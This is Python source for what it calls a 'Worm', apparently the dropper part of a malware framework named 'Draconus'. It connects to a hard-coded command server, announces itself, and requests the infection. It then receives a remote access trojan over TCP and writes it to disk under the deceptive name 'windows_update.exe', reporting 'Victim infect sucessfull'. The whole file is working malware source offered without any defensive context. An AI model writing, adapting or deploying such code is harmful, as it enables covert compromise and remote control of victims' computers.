import socket
import os

# Change this IP for your local network
SERVER = '192.168.100.16'
PORT = 5050
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'

# length of message (256 bytes)
RAW_LEN = 256

# length of response message (1 bytes)
RAW_ERROR = 1

# response message OK ( No Error)
RAW_NoE = '0'.encode(FORMAT)

# This is Worm
TYPE_WORM = 'WORM'

# directory list to put and hide RAT
DIRECTORY = ['/home/xxx/Draconus/']

# EXE file RAT name. How RAT names after sending to victim
EXE_RAT = 'windows_update.exe'

# the message that will initiate the infection
OP_START = 'OP_START'



# This class prepare message to send via TCP
class Msg:
    def __init__(self, msg, formats=FORMAT, raw_len=RAW_LEN):
        if msg == '':
            self.pmsg = '0'
        else:
            self.pmsg = msg
        self.formats = formats
        if len(msg) > raw_len:
            self.raw_len = len(msg)
        else:
            self.raw_len = raw_len
        
        self.msg = self.make(self.pmsg)
        self.len = self.make(len(self.pmsg), raw_len=RAW_LEN)
      

    def make(self, msg, raw_len=None):
        nmsg = str(msg).encode(self.formats)
        if len(nmsg) < self.raw_len:
            raw_len = RAW_LEN
        else:
            raw_len = self.raw_len
        while len(nmsg) < raw_len:
            nmsg += b' '
        return nmsg

class Worm:
    def __init__(self):
        self.worm = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.location = None
        self.is_connected = False

    
    def connect(self):
        while self.is_connected == False:
            try:
                self.worm.connect(ADDR)
                self.is_connected = True
            except:
                continue

    # send default pocket (message) to Draconus and recive response (1 bytes)
    # default length is 256 bytes
    def send_pocket(self, msg):
        send = Msg(msg)
        try:
            self.worm.send(send.msg)
        except:
            pass
        try:
            response = self.worm.recv(RAW_ERROR)
            return response
        except:
            return 0


    # recive standard pocket (message) and send response (1 bytes)
    # default length is 256 bytes
    def recive_pocket(self):
        output = None
        try:
            rec = self.worm.recv(RAW_LEN)
        except:
            return 0
        if rec:
            rec = rec.decode(FORMAT).rstrip(' ')
            output = rec
        try:
            self.worm.send(RAW_NoE)
        except:
            pass
        return output

    def hello_world(self):
        self.send_pocket(TYPE_WORM)

    def infect(self):
        error = None
        self.send_pocket(OP_START)
        # recive length of Rat
        len_rec = self.recive_pocket()
        rat_len = int(float(len_rec))
        # recive Rat
        raw_rat = b''
        while len(raw_rat) < rat_len:
            chunk = self.worm.recv(rat_len)
            raw_rat += chunk
            if not chunk:
                break

        if error:
            self.send_pocket('Error when recive RAT')
            return False
        else:
            for d in DIRECTORY:
                try:
                    with open(d + EXE_RAT, 'wb') as f:
                        f.write(raw_rat)
                    self.send_pocket('Victim infect sucessfull')
                    break
                except:
                    continue



    

##### START
WORM = Worm()
WORM.connect()
WORM.hello_world()
WORM.infect()




